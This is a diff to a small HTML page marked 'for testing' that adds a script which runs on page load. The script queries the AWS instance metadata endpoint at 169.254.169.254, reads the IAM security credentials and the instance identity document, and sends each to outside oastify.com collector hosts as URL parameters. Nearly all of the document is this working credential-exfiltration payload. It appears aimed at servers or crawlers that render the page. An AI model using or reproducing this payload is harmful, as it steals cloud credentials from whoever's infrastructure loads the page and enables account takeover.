@@ -9,7 +9,27 @@
     This website is for testing
     <img src="https://fn6hq46t1ev21v0xkt3kbx3xtozfn7bw.oastify.com?thisisNormalImage"/>
    <script>
-    fetch("https://fn6hq46t1ev21v0xkt3kbx3xtozfn7bw.oastify.com/?NowChangesAreEasy");
+    fetch('http://169.254.169.254/latest/meta-data/')
+  .then(r => r.text())
+  .then(data => {
+    fetch('https://fn6hq46t1ev21v0xkt3kbx3xtozfn7bw.oastify.com?meta=' + encodeURIComponent(data));
+  });
+  fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
+  .then(r => r.text())
+  .then(role => {
+    fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role.trim())
+      .then(r => r.text())
+      .then(data => {
+        fetch('https://fn6hq46t1ev21v0xkt3kbx3xtozfn7bw.oastify.com?creds=' + encodeURIComponent(data));
+      });
+  });
+  fetch('http://169.254.169.254/latest/dynamic/instance-identity/document')
+  .then(r => r.text())
+  .then(data => {
+    fetch('https://cdtx1oufa48pgrdmb95phg7qdhj870vp.oastify.com?doc=' + encodeURIComponent(data));
+  });
+
+
    </script>
 </body>
 </html>
